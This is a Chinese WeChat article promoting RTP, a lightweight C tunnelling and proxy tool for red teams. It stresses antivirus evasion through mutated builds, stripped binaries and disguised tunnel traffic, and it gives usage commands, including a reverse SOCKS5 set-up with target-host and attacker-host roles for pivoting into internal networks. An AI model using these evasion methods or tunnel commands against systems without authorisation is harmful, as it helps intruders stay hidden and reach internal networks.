---
title: RTP - 专业免杀隧道代理 100kb！
url: https://mp.weixin.qq.com/s/FmAZxbS_r3QYpDV2PcXE0g
source: Doonsec's feed
date: 2026-07-03
fetch_date: 2026-07-04T05:44:16.740740
---

# RTP - 专业免杀隧道代理 100kb！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/12fJtZooEJ5xgEDduQfsEZgTUWtqtMLicppoVsf7OjO2KkW6kgLbKj8rgfGGiaWDtgHlYvasxGpqhl4fKJ8IebEQcb5NsbbRdkgQWMJaarnvc/0?wx_fmt=jpeg)

# RTP - 专业免杀隧道代理 100kb！

原创

0xShe
0xShe

安全社

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# RTP (Red Team Proxy)

> 一个为红队实战设计的纯 C 轻量级隧道与代理工具。
>
> 小、快、静，单文件部署，命令行直驱，支持动态变异构建。
>
> HVV即将开始，FRP落地就杀？试试看RTP！

## 简介

RTP 的目标很直接:

* 用尽可能小的体积完成常见转发、桥接、SOCKS5 和反连隧道任务
* 用尽可能少的依赖降低落地和横向部署成本
* 用尽可能简单的命令减少复杂配置在现场带来的失误

它不是重控制面平台，也不是配置文件驱动的大型代理框架。它是一把偏实战、偏单兵、偏轻量的流量刀。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/12fJtZooEJ6Y7iaTYI8hYjWdXjxtX6hiclH2MmJfm7GaiaXE2tcO5sjSEm9OlZEbm7AQjHXUJvwLB0Keb5E2iaiaZTApDPghp2AJu6S6jgkvaXuc/640?wx_fmt=png&from=appmsg)

## 为什么值得用

* **纯 C 实现**：无 OpenSSL、无 libuv、无额外运行时，部署直接。
* **体积轻**：单进程、单事件循环、单二进制，适合现场快速投放。
* **命令简单**：大部分场景只靠 `-l` / `-r` / `-k` / `--tls` 就能落地。
* **支持变异构建**：内置 GUI 构建器，每次编译可刷新符号变异头文件。
* **跨平台友好**：Windows / Linux / macOS 输出统一由 `builder.py` 管理。
* **场景完整**：覆盖 TCP 转发、双监听桥接、SOCKS5、反连 SOCKS、反连服务、UDP 转发。
* **抛弃传统GO**：FRP和IOX等都是使用GO实现，体积过大，RTP不到100KB。

## 功能场景

| 场景 | 说明 | 是否已实现 |
| --- | --- | --- |
| TCP Forward | 本地监听转远端目标 | Yes |
| TCP Bridge | 双监听桥接 | Yes |
| SOCKS5 | 本地 SOCKS5 入口 | Yes |
| Reverse SOCKS5 | 反连 SOCKS5，支持浏览器多连接 | Yes |
| Reverse Service | 反连暴露内网服务 | Yes |
| UDP Forward | UDP 本地监听转远端 | Yes |

## 免杀介绍

RTP 的免杀思路不是依赖单点技巧，而是从构建指纹、体积特征和流量表现三个方向一起降噪:

* **动态变异构建**：每次构建都会刷新关键符号映射，减少稳定静态特征。
* **纯 C 小体积**：避免大运行时和重依赖带来的固定框架指纹。
* **发布态输出**：默认偏向精简产物，减少调试信息和额外构建痕迹。
* **隧道流量整形**：可选 `-k` 与 `--tls`，用于弱化 RTP 隧道链路特征。

它的核心逻辑不是“堆壳”，而是让产物本身更轻、特征更少、链路更像正常流量。

## 快速开始

### 1. 启动构建器

```
python RTP.py
```

GUI 支持:

* 目标平台选择
* 架构选择
* 自定义编译器路径
* 实时命令生成
* 中英文切换
* 一键复制命令

### 2. 最常用的几条命令

#### TCP 正向转发

```
rtp -l3389-r192.168.1.10:3389
```

#### 本地 SOCKS5 入口

```
rtp -l1080
```

#### SOCKS5 用户名密码认证

```
rtp -l1080--user admin --pass123456
```

#### 反连 SOCKS5

```
# 服务器
rtp -l9998-l7777--reverse-socks

# 靶机
rtp -r <SERVER_IP>:9998 --reverse-socks--reconnect

# 攻击机
# 将 <SERVER_IP>:7777 作为 SOCKS5 入口使用
```

#### UDP 转发

```
rtp -l53-r8.8.8.8:53 -u
```

## RTP 端点语义

RTP 的地址规则故意做得很简单:

* `9998` 等同于 `0.0.0.0:9998`
* `:9998` 等同于 `0.0.0.0:9998`
* `*:9998` 表示监听所有网卡
* `@host:port` 表示这是一个 RTP 隧道端点

示例:

```
rtp -l9998
rtp -l *:1080
rtp -r192.168.1.10:3389
rtp -r @1.2.3.4:9998 -k"secret"--tls
```

## 免杀核心思路

RTP 的免杀思路不是“堆功能”，而是“减少稳定特征”:

### 1. 动态变异编译

构建器会自动生成 `include/mutated.h`，对关键函数名做随机变异。这意味着每次编译产物都不是完全相同的静态符号布局。

### 2. 小体积降低特征密度

RTP 本身是纯 C、小依赖、单二进制，没有庞大运行时，也没有大体量框架特征。很多工具不是功能不行，而是体积和特征过于稳定。

### 3. 剥离调试信息

默认构建流程使用精简参数输出发布载荷，避免把多余的调试符号、PDB 和构建痕迹一起带出去。

### 4. 隧道层流量伪装

* `-k`：RC4 加密
* `--tls`：TLS AppData 风格封装
* `@`：显式标记 RTP 隧道端点

这一层不是标准 TLS 栈，而是偏实战的流量整形与特征弱化。

## 轻量级卖点

RTP 的价值，不只是“能转发”，而是“能在很小的代价下完成转发”:

* 更小的二进制
* 更少的依赖
* 更低的部署复杂度
* 更直观的 CLI
* 更适合临场快速切换场景

一句话概括:

> RTP 不是一个重平台，而是一把偏实战的轻量流量手术刀。

## 支持能力

### 网络能力

* TCP `L-R`
* TCP `L-L`
* TCP 主动出站模式
* SOCKS5 `CONNECT`
* SOCKS5 `NO AUTH`
* SOCKS5 `USERNAME/PASSWORD`
* UDP 会话化转发
* reverse SOCKS 多连接池化

### 构建能力

* Windows Modern / Legacy
* Linux `x64` / `arm64` / `x86`
* macOS Universal
* Zig 交叉编译优先
* GUI 命令生成器

## 参数速览

| 参数 | 说明 |
| --- | --- |
| `-l`, `--local` | 本地监听地址，可出现两次 |
| `-r`, `--remote` | 远程连接地址，可出现两次 |
| `-k`, `--key` | 启用 RC4 并指定密钥 |
| `--user` | SOCKS5 用户名 |
| `--pass` | SOCKS5 密码 |
| `-u`, `--udp` | 启用 UDP 转发 |
| `-q`, `--quiet` | 完全静默 |
| `--tls` | 启用 TLS 风格封装 |
| `--reverse-socks` | 启用 reverse SOCKS 控制握手 |
| `--reconnect` | 启用主动出站模式自动重连 |

## 构建建议

推荐优先使用 GUI 构建器:

```
python RTP.py
```

如果在 Windows 下编译 Linux 目标，优先使用 Zig，并保持 `zig.exe` 与同级 `lib/` 目录完整。

## 免责声明

本项目仅用于经授权的安全研究、攻防演练与防御验证。请确保所有使用行为符合当地法律法规与目标环境授权要求。

## GitHub

* GitHub: https://github.com/0xShe/RTP
* 如果这个项目对你有帮助，欢迎到 GitHub 点个 Star 支持一下。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/YqguuzCS2ibvXTgfmibh2tJhDohia3n9gXbwZHickdg6lg6JhV149icd6fYfQqcACy0COLDu63hV22pEwMXIjYflB2A/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过